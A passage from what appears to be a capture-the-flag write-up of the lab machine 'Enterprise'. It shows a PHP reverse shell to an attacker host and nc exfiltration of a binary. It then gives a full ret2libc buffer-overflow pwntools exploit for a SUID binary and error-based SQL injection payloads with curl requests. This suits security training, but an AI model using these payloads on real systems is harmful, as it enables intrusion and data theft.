drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 cache
drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 cli
drwxr-xr-x 20 www-data www-data    4096 Sep  3  2017 components
-r--r--r--  1 www-data www-data    3053 Sep  6  2017 configuration.php
-rwxrwxr-x  1 www-data www-data    3131 Sep  7  2017 entrypoint.sh
drwxrwxrwx  2 root     root        4096 Jun 15 20:43 files
-rw-rw-rw-  1 www-data www-data 5457775 Sep  8  2017 fs.out
-rw-rw-rw-  1 www-data www-data 8005634 Sep  8  2017 fsall.out
-rw-rw-rw-  1 www-data www-data 2044787 Sep  7  2017 goonthen.txt
-rw-r--r--  1 www-data www-data    3005 Aug 14  2017 htaccess.txt
drwxr-xr-x  5 www-data www-data    4096 Sep  6  2017 images
drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 includes
-rw-r--r--  1 www-data www-data    1420 Aug 14  2017 index.php
drwxr-xr-x  4 www-data www-data    4096 Aug 14  2017 language
drwxr-xr-x  5 www-data www-data    4096 Aug 14  2017 layouts
drwxr-xr-x 11 www-data www-data    4096 Aug 14  2017 libraries
-rw-rw-r--  1 www-data www-data     968 Sep  7  2017 makedb
-rw-rw-r--  1 www-data www-data     968 Sep  7  2017 makedb.php
drwxr-xr-x 26 www-data www-data    4096 Aug 14  2017 media
-rw-rw-rw-  1 www-data www-data 1474911 Sep  7  2017 mod.out
drwxr-xr-x 27 www-data www-data    4096 Aug 14  2017 modules
-rw-rw-rw-  1 www-data www-data  252614 Sep  7  2017 onemoretry.txt
-rw-rw-rw-  1 www-data www-data     793 Sep  8  2017 out.zip
drwxr-xr-x 16 www-data www-data    4096 Aug 14  2017 plugins
-rw-r--r--  1 www-data www-data     836 Aug 14  2017 robots.txt
drwxr-xr-x  5 www-data www-data    4096 Aug 14  2017 templates
drwxr-xr-x  2 www-data www-data    4096 Sep  6  2017 tmp
-rw-r--r--  1 www-data www-data    1690 Aug 14  2017 web.config.txt
-rw-r--r--  1 www-data www-data    3736 Sep  6  2017 wordpress-shell.php

```

A directory called `/files` is the only thing owned by root. In it, is `lcars.zip`:

```

www-data@a7018bfdc454:/var/www/html/files$ ls
lcars.zip

```

That was on the HTTPS website above, so it’s interesting it’s here.

`mount` shows that it’s actually a folder from the host being mapped into the container:

```

www-data@a7018bfdc454:/var/www/html/files$ mount -l | grep files
/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)

```

If I write to it, that shows up on the HTTP site:

```

www-data@a7018bfdc454:/var/www/html$ echo "is this the same site" > files/0xdf>

```

From my VM:

```

oxdf@parrot$ curl -s -k https://10.10.10.61/files/0xdf.txt
is this the same site

```

### Shell

I’ll write a reverse shell into a PHP file:

```

www-data@a7018bfdc454:/var/www/html$ echo -e "<?php\nsystem(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'\");\n?>"                  
<?php
system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'");
?>
www-data@a7018bfdc454:/var/www/html$ echo -e "<?php\nsystem(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'\");\n?>" > files/0xdf.php 

```

Now on visiting `https://10.10.10.61/files/0xdf.php`, I get a shell at `nc`:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.61] 54496
bash: cannot set terminal process group (1507): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enterprise:/var/www/html/files$ 

```

I’ll upgrade the shell:

```

www-data@enterprise:/var/www/html/files$ script /dev/null -c bash
Script started, file is /dev/null
www-data@enterprise:/var/www/html/files$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
www-data@enterprise:/var/www/html/files$ 

```

The box has one user, and I can grab `user.txt`:

```

www-data@enterprise:/home$ ls
jeanlucpicard
www-data@enterprise:/home$ ls jeanlucpicard/
user.txt
www-data@enterprise:/home$ cat jeanlucpicard/user.txt
08552d48************************

```

This host has the IPs 172.17.0.1 and 10.10.10.61, confirming that it is the Docker host.

## Shell as root

### Enumeration

`pstree` is installed, and a nice way to look at the running processes:

```

www-data@enterprise:/$ pstree
systemd-+-VGAuthService
        |-accounts-daemon-+-{gdbus}
        |                 `-{gmain}
        |-acpid
        |-agetty
        |-apache2-+-5*[apache2]
        |         `-apache2---sh---bash---bash---script---sh---bash---pstree
        |-atd
        |-cron
        |-dbus-daemon
        |-dockerd-+-docker-containe-+-docker-containe-+-mysqld---28*[{mysqld}]
        |         |                 |                 `-9*[{docker-containe}]
        |         |                 |-docker-containe-+-apache2---5*[apache2]
        |         |                 |                 `-9*[{docker-containe}]
        |         |                 |-docker-containe-+-apache2-+-apache2---sh-+
        |         |                 |                 |         `-5*[apache2]
        |         |                 |                 `-9*[{docker-containe}]
        |         |                 `-11*[{docker-containe}]
        |         |-docker-proxy---6*[{docker-proxy}]
        |         |-docker-proxy---4*[{docker-proxy}]
        |         `-16*[{dockerd}]
        |-irqbalance
        |-2*[iscsid]
        |-lvmetad
        |-lxcfs---4*[{lxcfs}]
        |-polkitd-+-{gdbus}
        |         `-{gmain}
        |-rsyslogd-+-{in:imklog}
        |          |-{in:imuxsock}
        |          `-{rs:main Q:Reg}
        |-snapd---6*[{snapd}]
        |-sshd
        |-systemd-journal
        |-systemd-logind
        |-systemd-resolve
        |-systemd-timesyn---{sd-resolve}
        |-systemd-udevd
        |-vmtoolsd---{gmain}
        `-xinetd

```

`xinetd` is interesting - the extended internet services daemon. It will allow you to run a program over a port. If I connect to port 32812 and then run it again while it’s hanging waiting for the access code, `pstree` shows the program:

```

www-data@enterprise:/$ pstree
systemd-+-VGAuthService
...[snip]...
        `-xinetd---lcars

```

That’s a SUID root-owned binary:

```

www-data@enterprise:/$ find / -name lcars 2>/dev/null -ls
   276351      4 -rw-r--r--   1 root     root          154 Sep  9  2017 /etc/xinetd.d/lcars
   131074     12 -rwsr-xr-x   1 root     root        12152 Sep  8  2017 /bin/lcars

```

I can run it and get the same prompt:

```

www-data@enterprise:/$ lcars 

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 

```

The binary is a 32-bit ELF:

```

www-data@enterprise:/$ file /bin/lcars
/bin/lcars: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=88410652745b0a94421ce22ea4278a8eaea8db57, not stripped

```

### Get Access Code

`ltrace` is on the box, so I’ll run it with that. It hangs waiting for the access code at a`fgets` call:

```

www-data@enterprise:/$ ltrace lcars
__libc_start_main(0x56555c91, 1, 0xffffdd44, 0x56555d30 <unfinished ...>
setresuid(0, 0, 0, 0x56555ca8)                   = 0xffffffff
puts(""
)                                         = 1
puts("                 _______ _______"...                 _______ _______  ______ _______
)      = 49
puts("          |      |       |_____|"...          |      |       |_____| |_____/ |______
)      = 49
puts("          |_____ |_____  |     |"...          |_____ |_____  |     | |    \_ ______|
)      = 49
puts(""
)                                         = 1
puts("Welcome to the Library Computer "...Welcome to the Library Computer Access and Retrieval System

)      = 61
puts("Enter Bridge Access Code: "Enter Bridge Access Code: 
)               = 27
fflush(0xf7fc7d60)                               = 0
fgets(

```

I’ll enter 0xdf, and see what continues:

```

fgets(0xdf
"0xdf\n", 9, 0xf7fc75a0)                   = 0xffffdc87
strcmp("0xdf\n", "picarda1")                     = -1
puts("\nInvalid Code\nTerminating Consol"...
Invalid Code
Terminating Console

)    = 35
fflush(0xf7fc7d60)                               = 0
exit(0 <no return ...>
+++ exited (status 0) +++

```

Perfect, the next call is a `strcmp` between my input and “picarda1”. Entering that works, and leads to a menu:

```

www-data@enterprise:/$ lcars

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 
picarda1

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

LCARS Bridge Secondary Controls -- Main Menu: 
1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input:

```

### Static Analysis

#### Exfil

At this point I can play with each of these functions, but I’m more interested in looking at it in Ghidra.

I’ll grab a copy of this file locally with `nc`, starting my listener on my box, and then running:

```

www-data@enterprise:/$ cat /bin/lcars | nc 10.10.14.8 443

```

At my VM:

```

oxdf@parrot$ nc -lnvp 443 > lcars
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.61] 55874
^C

```

This will hang, but I’ll just Ctrl-c after a few seconds. Always check the hashes after this kind of exfil:

```

www-data@enterprise:/$ md5sum /bin/lcars 
cf72dd251d6fee25e638e9b8be1f8dd3  /bin/lcars

```

```

oxdf@parrot$ md5sum lcars
cf72dd251d6fee25e638e9b8be1f8dd3  lcars

```

Looks good.

#### Ghidra

I’ll import the binary into a Ghidra project, and then open it in the code browser and let it do the run analysis steps.

There aren’t too many functions:

![image-20210615174817844](https://0xdfimages.gitlab.io/img/image-20210615174817844.png)

`main`, `main_menu`, `bridgeAuth` all jump out. As I look through the code, I’ll rename and retype variables to make it make more sense. `main` asks for an access code, calls `bridgeAuth`, and exits:

```

void main(void)

{
  char access_code [9];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setresuid(0,0,0);
  startScreen();
  puts("Enter Bridge Access Code: ");
  fflush(stdout);
  fgets(access_code,9,stdin);
  bridgeAuth(access_code);
  return 0;
}

```

`bridgeAuth` checks the input against the static string, “picarda1”, and calls `main_menu` if there’s a match and exits otherwise:

```

void bridgeAuth(char *user_code)

{
  int res;
  char code [10];
  
  code[0] = 'p';
  code[1] = 'i';
  code[2] = 'c';
  code[3] = 'a';
  code[4] = 'r';
  code[5] = 'd';
  code[6] = 'a';
  code[7] = '1';
  code[8] = '\0';
  res = strcmp(user_code,code);
  if (res == 0) {
    main_menu();
  }
  else {
    puts("\nInvalid Code\nTerminating Console\n");
  }
  fflush(stdout);
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

`main_menu` reads input as an int and then uses that (assuming it’s less than 8), to jump to a function given an offset in a table relative to the GOT:

```

void main_menu(void)

{
  int menu_selection;
  
  menu_selection = 0;
  startScreen();
  puts("\n");
  puts("LCARS Bridge Secondary Controls -- Main Menu: \n");
  puts("1. Navigation");
  puts("2. Ships Log");
  puts("3. Science");
  puts("4. Security");
  puts("5. StellaCartography");
  puts("6. Engineering");
  puts("7. Exit");
  puts("Waiting for input: ");
  fflush(stdout);
  __isoc99_scanf(&%d,&menu_selection);
  if ((uint)menu_selection < 8) {
                    /* WARNING: Could not recover jumptable at 0x0001097e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*(code *)((int)&_GLOBAL_OFFSET_TABLE_ + (int)(&function_addr_table)[menu_selection]))();
    return;
  }
  unable();
  return;
}

```

The `function_addr_table` looks like:

![image-20210615180441605](https://0xdfimages.gitlab.io/img/image-20210615180441605.png)

One of the functions listed in Ghidra was `disableForcefields`:

```

void disableForcefields(void)

{
  undefined user_input [204];
  
  startScreen();
  puts("Disable Security Force Fields");
  puts("Enter Security Override:");
  fflush(stdout);
  __isoc99_scanf(&%s,user_input);
  printf("Rerouting Tertiary EPS Junctions: %s",user_input);
  return;
}

```

It reads a single string from the user with `scanf`, and then just prints it back as part of a message. `scanf` is a [dangerous function](https://stackoverflow.com/questions/2430303/disadvantages-of-scanf#answer-2430978). The buffer the string is read into is 204 bytes, but there’s no limit on the amount of input the user can send, which allows the user to overflow that buffer, which can lead to code execution.

### Segmentation Fault

To show this overflow is possible, I’ll send a large string in and watch for a segmentation fault. I can use Python to generate the different inputs to send the access code and menu selection and then a string. So with a legit string, “Test”, it prints that back:

```

oxdf@parrot$ python -c 'print("picarda1\n4\n" + "Test")' | ./lcars

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

LCARS Bridge Secondary Controls -- Main Menu: 
1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input: 
Disable Security Force Fields
Enter Security Override:
Rerouting Tertiary EPS Junctions: Test

```

But with a long string:

```

oxdf@parrot$ python -c 'print("picarda1\n4\n" + "A"*250)' | ./lcars

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

LCARS Bridge Secondary Controls -- Main Menu: 
1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input: 
Disable Security Force Fields
Enter Security Override:
Segmentation fault

```

What’s happening is that the buffer is stored on the stack, and the stack builds up with new objects getting lower addresses. When the `disableForcefields` function is called, first the return address is put on the stack, then some other stuff, and then 204 bytes for this buffer. When I send 250 As, it ends up overwriting the function return address with 0x41414141, which isn’t a valid address, and then the program crashes.

### Protections

#### ASLR

ASLR (address space layout randomization) is a protection that’s specific to the host, not the program, and the setting is stored in `/proc/sys/kernel/randomize_va_space`. On systems today, it’s rare to see it disabled, but Enterprise is an older machine, and it’s disabled (0):

```

www-data@enterprise:/$ cat /proc/sys/kernel/randomize_va_space 
0

```

I can verify this with `ldd` on the binary and looking at where libc loads:

```

www-data@enterprise:/$ for i in {1..10}; do ldd /bin/lcars | grep libc; done
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)

```

When ASLR is enabled, the address will change each time.

#### CheckSec

Without ASLR, I will almost certainly go with a return to libc attack, but I can check the binary-specific protections as well with `checksec`:

```

oxdf@parrot$ checksec lcars
[*] '/media/sf_CTFs/hackthebox/enterprise-10.10.10.61/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments

```

PIE means that the address in the main binary will be randomized, so I won’t want to do any ROP or jumping to locations in the main binary, as I can’t predict those (at least without a way to leak an address). NX is disabled, so I could write shellcode onto the stack and then jump into it. But a return to libc is just easier.

### Return Offset

I need to know the exact point in my input that ends up overwriting the return address. To do that, I’ll generate a pattern of characters to pass in as input. This is commonly done with `msf-pattern_create`, but I was playing with [this Python implementation](https://github.com/ickerwx/pattern) for Enterprise:

```

oxdf@parrot$ pattern 
Usage: /usr/local/bin/pattern (create | offset) <value> <buflen>
oxdf@parrot$ pattern create 250
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A

```

Now I’ll run `lcars` in `gdb` (`-q` to skip all the intro printing, and I’ve got [Peda](https://github.com/longld/peda) installed as well):

```

oxdf@parrot$ gdb -q lcars
Reading symbols from lcars...
(No debugging symbols found in lcars)
gdb-peda$

```

I’ll enter `r` to run, and give it the access code and select 4:

```

gdb-peda$ r
Starting program: /media/sf_CTFs/hackthebox/enterprise-10.10.10.61/lcars 

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|
                                                                    
Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 
picarda1
                                                                    
                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|
                                                                    
Welcome to the Library Computer Access and Retrieval System

LCARS Bridge Secondary Controls -- Main Menu:
1. Navigation
2. Ships Log
3. Science
4. Security                            
5. StellaCartography               
6. Engineering                 
7. Exit                    
Waiting for input:
4
Disable Security Force Fields
Enter Security Override:

```

I’ll enter the pattern, and the program crashes:

![image-20210616073925642](https://0xdfimages.gitlab.io/img/image-20210616073925642.png)

On a 32-bit program, the invalid address has been loaded into the EIP register (which has the address of the next instruction). In this case, it’s 0x31684130, or `0Ah1`.

I can pass back either the hex address or the four characters string, and `pattern` will tell me how far into the input that was:

```

oxdf@parrot$ pattern offset 0Ah1 250
212
oxdf@parrot$ pattern offset 0x31684130 250
212

```

I can double check this with a string of 212 As and then four B:

```

oxdf@parrot$ python -c 'print("A"*212 + "BBBB")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

```

I’ll do the same thing in `gdb`, and at the crash:

![image-20210616074240671](https://0xdfimages.gitlab.io/img/image-20210616074240671.png)

### Return to Libc

#### Theory

I’ve shown return to libc attacks before, and gave a detailed explanation in [Frolic](/2019/03/23/htb-frolic.html#background). The idea is that I’m going to overwrite the return address with the address of the `system` function in libc. The next address down the stack is the address to return from when `system` is done. This can be junk, or I can give it the address of `exit` to cleanly end. Then I need the arguments for `system`. I want to call `system("/bin/sh")`, so I need the address of a “/bin/sh” string in libc.

#### Practice

I’ve [shown before](/2019/03/23/htb-frolic.html#addresses) using `ldd` to get the libc base address, then `readelf` to get the offsets of `system` and `exit`, and `strings` to get the address of `/bin/sh`. `readelf` isn’t on Enterprise, but `gdb` is, and it can get the needed addresses.

Drop into `gdb`:

```

www-data@enterprise:/$ gdb -q /bin/lcars
Reading symbols from lcars...(no debugging symbols found)...done.
(gdb)

```

If I try to print the addresses now, `gdb` won’t know them because the program isn’t started or loaded.

```

(gdb) p &system
No symbol table is loaded.  Use the "file" command.

```

I’ll put a breakpoint at `main`, and run to that:

```

(gdb) b main
Breakpoint 1 at 0xca0
(gdb) r
Starting program: /bin/lcars 

Breakpoint 1, 0x56555ca0 in main ()
(gdb)

```

Now `p` (or `print`) will get the addresses:

```

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>

```

`find` will look for a string between two memory addresses. I know there’s a ““/bin/sh” in libc, so I’ll search from the start of libc out an arbitrary amount (if I don’t find it, make it a bit bigger):

```

(gdb) find 0xf7e32000,+5000000,"/bin/sh"
0xf7f70a0f
warning: Unable to access 16000 bytes of target memory at 0xf7fca797, halting search.
1 pattern found.

```

There’s a address, and I can verify it with `x/s` (display string):

```

(gdb) x/s 0xf7f70a0f
0xf7f70a0f:     "/bin/sh"

```

The problem with that address is that it has an 0x0a byte in it. That’s the ASCII code for newline. The `scanf` function was reading `%s`, which, looking at the [docs](https://www.cplusplus.com/reference/cctype/isspace/):

> Any number of non-whitespace characters, stopping at the first [whitespace](https://www.cplusplus.com/isspace) character found. A terminating null character is automatically added at the end of the stored sequence.

That won’t work. I can try to look for just “sh” (which is actually looking for three bytes in a row, including the null byte at the end of the string):

```

(gdb) find 0xf7e32000,+5000000,"sh"     
0xf7f6ddd5
0xf7f6e7e1
0xf7f70a14
0xf7f72582
warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
4 patterns found.

```

The third one is the same address from the first search, just starting five bytes later. I can try any of the others.

### Pwn Script

I’ll pull all that together into a really simple Python script:

```

#!/usr/bin/env python3

from pwn import *

system_addr = p32(0xF7E4C060)
exit_addr = p32(0xF7E3FAF0)
sh_addr = p32(0xF7F6DDD5)

payload = b"A" * 212 + system_addr + exit_addr + sh_addr

r = remote("10.10.10.61", 32812)
r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(payload)
r.interactive()

```

It creates the payload with 212 bytes of junk followed by the addresses. Then it uses [pwntools](https://github.com/Gallopsled/pwntools) to interact with the remote system, sending the access code and menu selection before the payload, and then dropping into an interactive shell.

It works:

```

oxdf@parrot$ python root.py 
[+] Opening connection to 10.10.10.61 on port 32812: Done
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)

```

And I can get `root.txt`:

```

$ cat /root/root.txt
cf941b35************************

```

## Beyond Root - Error-Based SQLI

### sqlmap Query

The example for the error-based injection that `sqlmap` gave was:

```

query=1 AND (SELECT 7485 FROM(SELECT COUNT(*),CONCAT(0x716a717871,(SELECT (ELT(7485=7485,1))),0x71627a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

```

Throwing that into Firefox returns:

![image-20210616094508546](https://0xdfimages.gitlab.io/img/image-20210616094508546.png)

The challenge here is that the plugin is printing the result of `$db->query`:

```

    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;

```

On a good query, that’s an object which leads to an error. But if I can make the query error out, then what returns into `$result` is an error string, and that will `echo` without error.

To show this, I’ll drop an SSH key into `/root/.ssh/authorized_keys` on Enterprise and get a better shell. Then I can drop into the `mysql` docker container:

```

root@enterprise:~# docker ps
CONTAINER ID        IMAGE                     COMMAND                  CREATED             STATUS              PORTS                  NAMES
a7018bfdc454        joomla:apache-php7        "/entrypoint.sh ap..."   3 years ago         Up 18 hours         0.0.0.0:8080->80/tcp   joomla
b8319d86d21e        wordpress:php5.6-apache   "docker-entrypoint..."   3 years ago         Up 18 hours         0.0.0.0:80->80/tcp     wordpress
15af95635b7d        mysql:latest              "docker-entrypoint..."   3 years ago         Up 18 hours         3306/tcp               mysql
root@enterprise:~# docker exec -it mysql bash
root@15af95635b7d:/#

```

Using the password from the WordPress config, I’ll connect to the DB:

```

root@15af95635b7d:/# mysql -pNCC-1701E wordpress
...[snip]...
mysql>

```

Running the query that is created above, the same message comes back:

```

mysql> SELECT ID FROM wp_posts WHERE post_name = 1 AND (SELECT 7485 FROM(SELECT COUNT(*),CONCAT(0x716a717871,(SELECT (ELT(7485=7485,1))),0x71627a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a);
ERROR 1062 (23000): Duplicate entry 'qjqxq1qbzxq1' for key '<group_key>'

```

### Background

#### COUNT

To understand Double Query Error-Based injection, it’s important to understand a couple SQL keywords.

`COUNT(*)` will return show the number of rows in a given group. So I can find the number of posts:

```

mysql> select COUNT(*) from wp_posts;
+----------+
| COUNT(*) |
+----------+
|       42 |
+----------+
1 row in set (0.00 sec)

```

Or I can group by `post_title` and get the number of each title:

```

mysql> select COUNT(*), post_title from wp_posts group by post_title;
+----------+---------------------------------+
| COUNT(*) | post_title                      |
+----------+---------------------------------+
|        4 |                                 |
|        1 | A homepage section              |
|        1 | About                           |
|        1 | Auto Draft                      |
|        1 | Blog                            |
|        2 | Coffee                          |
|        1 | Contact                         |
|        1 | cropped-enterprise_header-1.jpg |
|        1 | Email                           |
|        2 | enterprise_header               |
|        2 | Espresso                        |
|        1 | Facebook                        |
|        2 | Hello world!                    |
|        2 | Home                            |
|        1 | Instagram                       |
|        3 | Passwords                       |
|        2 | Sandwich                        |
|        2 | Stardate 49827.5                |
|        2 | Stardate 50893.5                |
|        2 | Stardate 52179.4                |
|        2 | Stardate 55132.2                |
|        1 | test                            |
|        1 | Twitter                         |
|        3 | YAYAYAYAY.                      |
|        1 | Yelp                            |
+----------+---------------------------------+
25 rows in set (0.01 sec)

```

#### FLOOR(RAND()\*2)

I’m also going to make sure of `RAND` and `FLOOR` here. `RAND()` will generate a number between 0 and 1. `FLOOR` will round it down to an int. The expression `FLOOR(RAND()*2)` will half the time produce a 1, and half a 0. And I can call this while selecting rows from a table without actually selecting any data from that table:

```

mysql> select floor(rand()*2) from wp_posts;
+-----------------+
| floor(rand()*2) |
+-----------------+
|               0 |
|               1 |
|               0 |
|               0 |
|               0 |
|               0 |
...[snip]...
|               1 |
|               1 |
|               1 |
|               1 |
|               0 |
+-----------------+
42 rows in set (0.01 sec)

```

There’s 42 ones and zeros because there’s 42 rows in that table.

#### Error

The error is going to come when I try to do a `COUNT` and a `GROUPBY` on a bunch of objects that repeat. For example, I’ll work from the query above with 42 ones and zeros. I’ll name the output column `a`, and then group by it. I’ll expect results like this:

```

mysql> select COUNT(*),floor(rand()*2) as a from wp_posts group by a;
+----------+---+
| COUNT(*) | a |
+----------+---+
|       30 | 0 |
|       12 | 1 |
+----------+---+
2 rows in set (0.00 sec)

mysql> select COUNT(*),floor(rand()*2) as a from wp_posts group by a;
+----------+---+
| COUNT(*) | a |
+----------+---+
|       20 | 0 |
|       22 | 1 |
+----------+---+
2 rows in set (0.00 sec)

mysql> select COUNT(*),floor(rand()*2) as a from wp_posts group by a;
+----------+---+
| COUNT(*) | a |
+----------+---+
|       19 | 0 |
|       23 | 1 |
+----------+---+
2 rows in set (0.00 sec)

```

But many times, I get this:

```

mysql> select COUNT(*),floor(rand()*2) as a from wp_posts group by a;
ERROR 1062 (23000): Duplicate entry '1' for key '<group_key>'

```

Somehow the grouped table that’s being passed to `COUNT` contains a duplicate entry, and it’s throwing the error.

### Building Query

Let’s start with a simple query to run, `select user();`:

```

mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.01 sec)

```

The goal is to get `root@localhost` into an error message. I’ll add a `COUNT` column and a `CONCAT` of the data I want to get plus the random 0 or 1:

```

mysql> select COUNT(*),concat(user(), floor(rand()*2)) as a from wp_posts group by a;
+----------+-----------------+
| COUNT(*) | a               |
+----------+-----------------+
|       19 | root@localhost0 |
|       23 | root@localhost1 |
+----------+-----------------+
2 rows in set (0.00 sec)

mysql> select COUNT(*),concat(user(), floor(rand()*2)) as a from wp_posts group by a;
ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key '<group_key>'

```

There’s an error message that contains the data I want to exfil, knowing that the last character (0 or 1) is not part of the data.

I’ll try to pull some data. First, I’ll change that table to `information_schema.columns`, as having a bunch more columns seems to make the error come up more often. Now I’ll replace `user()` with a query. I’ll also add in some tags that I could search on programmatically to extract the data. Finally, I want to put it into the format that fits the injection I have.

```

mysql> select id from wp_posts where post_name = 1 AND (select 1 from (select COUNT(*),concat((select mid(post_title,1,64) from wp_posts where id = 68), 0x3078646666647830, floor(rand()*2)) as a from information_schema.columns group by a) as x);
ERROR 1062 (23000): Duplicate entry 'Passwords0xdffdx01' for key '<group_key>'

```

Now I can get that with `curl`:

```

oxdf@parrot$ curl 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1%20AND%20(select%201%20from%20(select%20COUNT(*),concat((select%20mid(post_title,1,64)%20from%20wp_posts%20where%20id%20=%2068),%200x3078646666647830,%20floor(rand()*2))%20as%20a%20from%20information_schema.columns%20group%20by%20a)%20as%20x)'
<br />
<b>Warning</b>:  mysqli::query(): (23000/1062): Duplicate entry 'Passwords0xdffdx01' for key '&lt;group_key&gt;' in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>15</b><br />

```

I can pull content as well:

```

oxdf@parrot$ curl -s 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1%20AND%20(select%201%20from%20(select%20COUNT(*),concat((select%20mid(post_content,1,64)%20from%20wp_posts%20where%20id%20=%2068),%200x3078646666647830,%20floor(rand()*2))%20as%20a%20from%20information_schema.columns%20group%20by%20a)%20as%20x)'
<br />
<b>Warning</b>:  mysqli::query(): (23000/1062): Duplicate entry 'Needed somewhere to put some passwords quickly

ZxJyhGem4k338S' for key '&lt;group_key&gt;' in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>15</b><br />

```

I need the `mid` on the results because if too much data comes back, it handles that as multiple lines, and breaks the error message.